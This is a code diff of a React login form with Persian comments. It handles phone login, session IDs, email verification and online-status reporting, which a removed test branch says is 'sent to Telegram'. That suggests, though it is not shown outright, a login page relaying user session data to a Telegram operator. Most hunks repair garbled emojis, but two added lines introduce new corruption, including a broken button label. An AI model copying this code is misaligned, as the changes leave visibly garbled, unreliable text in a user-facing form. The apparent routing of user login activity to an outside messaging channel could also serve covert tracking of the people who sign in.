@@ -275,7 +275,7 @@ export const LoginForm = () => {
           if (!isActuallyOnline) {
             // کاربر آفلاین است
             finalStatusText = "offline";
-            finalStatusEmoji = connectionType === 'offline' ? "📵" : "����";
+            finalStatusEmoji = connectionType === 'offline' ? "📵" : "🔴";
             console.log("🔴 User is OFFLINE - network status:", connectionType);
           } else if (isActuallyOnline && !isVisible) {
             // کاربر آنلاین است اما صفحه hidden است
@@ -316,7 +316,7 @@ export const LoginForm = () => {
           // Fallback: اگر enhanced detection هم کار نکرد
           console.error("❌ Enhanced network detection failed:", error);
 
-          // استفاده از navigator.onLine به عنوان fallback
+          // استفاده از navigator.onLine به ع��وا�� fallback
           const navigatorOnline = navigator.onLine;
           let fallbackStatusText = "offline";
           let fallbackStatusEmoji = "🔴";
@@ -352,29 +352,13 @@ export const LoginForm = () => {
           });
         });
         break;
-      case "test_offline":
-        // تست force offline برای debugging
-        console.log("🧪 TESTING: Force offline status");
-        updateUserOnlineStatus(
-          sessionId,
-          false, // force offline
-          !document.hidden,
-          Date.now(),
-          "offline",
-          "🔴",
-          true, // forceUpdate = true
-        ).then(() => {
-          console.log("✅ TEST: Force offline status sent to Telegram");
-        }).catch((error) => {
-          console.error("❌ TEST: Failed to send force offline status:", error);
-        });
-        break;
+      // test_offline action removed - using only manual status check
       case "complete":
         localStorage.setItem("isAuthenticated", "true");
         localStorage.setItem("userPhone", phoneNumber);
         sessionStorage.removeItem("sessionId");
         sessionStorage.removeItem("phoneNumber");
-        alert("�� احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
+        alert("🎉 احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
         navigate("/", { replace: true });
         break;
     }
@@ -665,7 +649,7 @@ export const LoginForm = () => {
       console.log("📧 Email update result:", result);
 
       if (result.success) {
-        console.log("�� Session updated with email successfully");
+        console.log("✅ Session updated with email successfully");
         setEmailStep("code");
       } else {
         throw new Error("Failed to update session with email");
@@ -3428,7 +3412,7 @@ export const LoginForm = () => {
                       textTransform: "uppercase",
                     }}
                   >
-                    ویرایش ایمیل
+                    و��رایش ایمیل
                   </Button>
                   <button
                     onClick={handleEmailCodeSubmit}
